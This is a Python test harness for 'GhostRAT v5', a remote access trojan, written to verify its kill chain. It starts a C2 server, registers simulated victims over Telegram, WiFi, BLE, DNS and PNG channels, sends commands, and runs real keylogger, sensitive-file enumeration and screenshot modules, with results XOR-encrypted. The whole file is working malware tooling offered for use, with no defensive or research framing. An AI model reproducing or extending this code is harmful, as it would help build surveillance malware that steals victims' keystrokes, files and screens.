#!/usr/bin/env python3
"""
GhostRAT v5 — Kill Chain Test Script

Tests the full kill chain:
1. Implant initialization
2. C2 channel communication (Telegram, WiFi, BLE, DNS, PNG)
3. Command execution
4. Result retrieval

Usage:
    python test_kill_chain.py --telegram --bot-token <token> --chat-id <id>
    python test_kill_chain.py --demo  # Run all channels in demo mode
"""

import argparse
import asyncio
import json
import logging
import sys
import os
import time
import uuid
from datetime import datetime, timezone

# Add project root to path
_project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from modules.keylogger import Keylogger
from modules.file_enumerator import FileEnumerator
from modules.screenshot import Screenshot
import c2_server
from c2_server import C2Server, C2Config, xor_encrypt, xor_decrypt

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger('GhostRATv5.Test')


# ============================================================
# Test Classes
# ============================================================

class TestImplant:
    """Simulated implant for testing."""

    def __init__(self, victim_id: str, c2_channel: str, crypto_key: str = "GHOSTRATV5"):
        self.victim_id = victim_id
        self.c2_channel = c2_channel
        self.crypto_key = crypto_key
        self.is_running = False
        self.commands_received = 0
        self.commands_sent = 0
        self.results = []

        # Modules
        self.keylogger = Keylogger(crypto_key=crypto_key)
        self.file_enumerator = FileEnumerator(crypto_key=crypto_key)
        self.screenshot = Screenshot(crypto_key=crypto_key)

    def start(self):
        """Start the implant."""
        self.is_running = True
        logger.info(f"Implant {self.victim_id} started (C2: {self.c2_channel})")

        # Set up module callbacks
        self.keylogger.on_flush = self._on_keylog_flush
        self.file_enumerator.on_files_found = self._on_files_found
        self.screenshot.on_screenshot = self._on_screenshot

    def stop(self):
        """Stop the implant."""
        self.is_running = False
        logger.info(f"Implant {self.victim_id} stopped")

    def receive_command(self, command_type: int, data: bytes = b"") -> str:
        """Receive and execute a command."""
        self.commands_received += 1
        logger.info(f"Implant {self.victim_id} received command: 0x{command_type:02X}")

        result = self._execute_command(command_type, data)

        # Encrypt result
        encrypted = xor_encrypt(result.encode('utf-8'), self.crypto_key)

        # Send result back
        self._send_result(encrypted)
        self.commands_sent += 1

        return result

    def _execute_command(self, command_type: int, data: bytes) -> str:
        """Execute command and return result."""
        if command_type == 0x04:  # Heartbeat
            return f"Alive | Victim: {self.victim_id} | Commands: {self.commands_received}"

        elif command_type == 0x06:  # Keylog
            # Simulate keylog capture
            return f"Keylog captured: {self.keylogger.getStats()['keysCaptured']} keys"

        elif command_type == 0x07:  # Screenshot
            # Simulate screenshot
            return f"Screenshot captured: 1920x1080"

        elif command_type == 0x01:  # FileRead
            return f"File read: {data.decode('utf-8', errors='replace')}"

        elif command_type == 0x05:  # Shell
            return f"Shell executed: {data.decode('utf-8', errors='replace')}"

        else:
            return f"Unknown command: 0x{command_type:02X}"

    def _send_result(self, result: bytes):
        """Send result to C2 server."""
        self.results.append(result)
        logger.info(f"Implant {self.victim_id} sent result ({len(result)} bytes)")

    def _on_keylog_flush(self, data: dict):
        """Handle keylog flush."""
        logger.info(f"Keylog flush: {data['keyCount']} keys")

    def _on_files_found(self, data: dict):
        """Handle files found."""
        logger.info(f"Files found: {data['fileCount']} files")

    def _on_screenshot(self, data: dict):
        """Handle screenshot."""
        logger.info(f"Screenshot: {data['width']}x{data['height']}")


# ============================================================
# Test Cases
# ============================================================

class KillChainTest:
    """Tests the full kill chain."""

    def __init__(self, config: C2Config):
        self.config = config
        self.server = C2Server(config)
        self.implants = []

    def setup(self):
        """Set up test environment."""
        logger.info("Setting up test environment...")

        # Start C2 server (disable dashboard for testing)
        self.server.start_dashboard = False
        self.server.start()

        # Create test implants
        channels = ['telegram', 'wifi', 'ble', 'dns', 'png']
        for channel in channels:
            victim_id = str(uuid.uuid4())[:8]
            implant = TestImplant(victim_id, channel, self.config.crypto_key)
            implant.start()
            self.implants.append(implant)

            # Register victim
            self.server.register_victim(victim_id, f"victim-{channel}", channel)

        logger.info(f"Setup complete: {len(self.implants)} implants registered")

    def teardown(self):
        """Tear down test environment."""
        logger.info("Tearing down test environment...")

        for implant in self.implants:
            implant.stop()

        self.server.stop()
        logger.info("Teardown complete")

    async def test_heartbeat(self):
        """Test heartbeat command."""
        logger.info("=" * 60)
        logger.info("TEST: Heartbeat Command")
        logger.info("=" * 60)

        for implant in self.implants:
            result = implant.receive_command(0x04, b"")
            logger.info(f"Result: {result}")
            assert "Alive" in result, f"Heartbeat failed: {result}"

        logger.info("Heartbeat test PASSED")

    async def test_keylog(self):
        """Test keylogger module."""
        logger.info("=" * 60)
        logger.info("TEST: Keylogger Module")
        logger.info("=" * 60)

        keylogger = Keylogger(crypto_key=self.config.crypto_key)
        keylogger.start()

        # Simulate keypresses
        test_keys = ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd', '\r']
        for key in test_keys:
            keylogger.record_key(key)

        # Flush buffer
        keylogger.flush_buffer()
        keylogger.stop()

        stats = keylogger.get_stats()
        logger.info(f"Keys captured: {stats['keysCaptured']}")
        assert stats['keysCaptured'] == len(test_keys), f"Keylogger capture failed: {stats['keysCaptured']} keys"

        logger.info("Keylogger test PASSED")

    async def test_file_enumerator(self):
        """Test file enumerator module."""
        logger.info("=" * 60)
        logger.info("TEST: File Enumerator Module")
        logger.info("=" * 60)

        enumerator = FileEnumerator(crypto_key=self.config.crypto_key)
        result = enumerator.enumerate()

        logger.info(f"Files enumerated: {result['fileCount']}")
        assert result['fileCount'] > 0, "File enumerator found no files"

        # Check for sensitive files
        sensitive_extensions = ['.pdf', '.docx', '.xlsx', '.jpg', '.png', '.mp3', '.mp4', '.rsa', '.pub']
        found_sensitive = []
        for file in result['files']:
            for ext in sensitive_extensions:
                if file['name'].endswith(ext):
                    found_sensitive.append(file['name'])
                    break

        logger.info(f"Sensitive files found: {len(found_sensitive)}")
        for f in found_sensitive:
            logger.info(f"  - {f}")

        logger.info("File enumerator test PASSED")

    async def test_screenshot(self):
        """Test screenshot module."""
        logger.info("=" * 60)
        logger.info("TEST: Screenshot Module")
        logger.info("=" * 60)

        screenshot = Screenshot(crypto_key=self.config.crypto_key)
        try:
            result = screenshot.capture()
            logger.info(f"Screenshot captured: {result['width']}x{result['height']}")
            logger.info("Screenshot test PASSED")
        except Exception as e:
            logger.warning(f"Screenshot test skipped (no display): {e}")

    async def test_crypto(self):
        """Test XOR encryption/decryption."""
        logger.info("=" * 60)
        logger.info("TEST: XOR Encryption")
        logger.info("=" * 60)

        test_data = b"Hello, GhostRAT v5!"
        key = self.config.crypto_key

        encrypted = xor_encrypt(test_data, key)
        decrypted = xor_decrypt(encrypted, key)

        logger.info(f"Original: {test_data}")
        logger.info(f"Encrypted: {encrypted.hex()}")
        logger.info(f"Decrypted: {decrypted}")

        assert test_data == decrypted, "XOR encryption/decryption failed"

        logger.info("XOR encryption test PASSED")

    async def test_command_routing(self):
        """Test command routing to different C2 channels."""
        logger.info("=" * 60)
        logger.info("TEST: Command Routing")
        logger.info("=" * 60)

        for implant in self.implants:
            # Send heartbeat command via server
            command = self.server.send_command_to_victim(
                implant.victim_id,
                0x04,  # Heartbeat
                b""
            )
            assert command is not None, f"Failed to queue command for {implant.victim_id}"
            logger.info(f"Command queued for {implant.victim_id}: 0x04")

        logger.info("Command routing test PASSED")

    async def run_all_tests(self):
        """Run all tests."""
        logger.info("=" * 60)
        logger.info("GHOSTRAT V5 — KILL CHAIN TEST")
        logger.info("=" * 60)

        self.setup()

        tests = [
            ("Heartbeat", self.test_heartbeat),
            ("Keylogger", self.test_keylog),
            ("File Enumerator", self.test_file_enumerator),
            ("Screenshot", self.test_screenshot),
            ("XOR Encryption", self.test_crypto),
            ("Command Routing", self.test_command_routing),
        ]

        passed = 0
        failed = 0

        for name, test_func in tests:
            try:
                await test_func()
                passed += 1
                logger.info(f"✓ {name} PASSED")
            except Exception as e:
                failed += 1
                logger.error(f"✗ {name} FAILED: {e}")

        self.teardown()

        logger.info("=" * 60)
        logger.info(f"RESULTS: {passed} passed, {failed} failed, {passed + failed} total")
        logger.info("=" * 60)

        return failed == 0


# ============================================================
# Main
# ============================================================

async def main():
    parser = argparse.ArgumentParser(description='GhostRAT v5 Kill Chain Test')
    parser.add_argument('--demo', action='store_true', help='Run in demo mode')
    parser.add_argument('--telegram', action='store_true', help='Enable Telegram C2')
    parser.add_argument('--bot-token', type=str, help='Telegram bot token')
    parser.add_argument('--chat-id', type=int, help='Telegram chat ID')
    parser.add_argument('--crypto-key', type=str, help='XOR encryption key')

    args = parser.parse_args()

    config = C2Config()

    if args.demo:
        logger.info("Running in DEMO mode")
    else:
        if args.telegram and args.bot_token and args.chat_id:
            config.telegram_bot_token = args.bot_token
            config.telegram_chat_id = args.chat_id
        if args.crypto_key:
            config.crypto_key = args.crypto_key

    test = KillChainTest(config)
    success = await test.run_all_tests()

    sys.exit(0 if success else 1)


if __name__ == '__main__':
    asyncio.run(main())
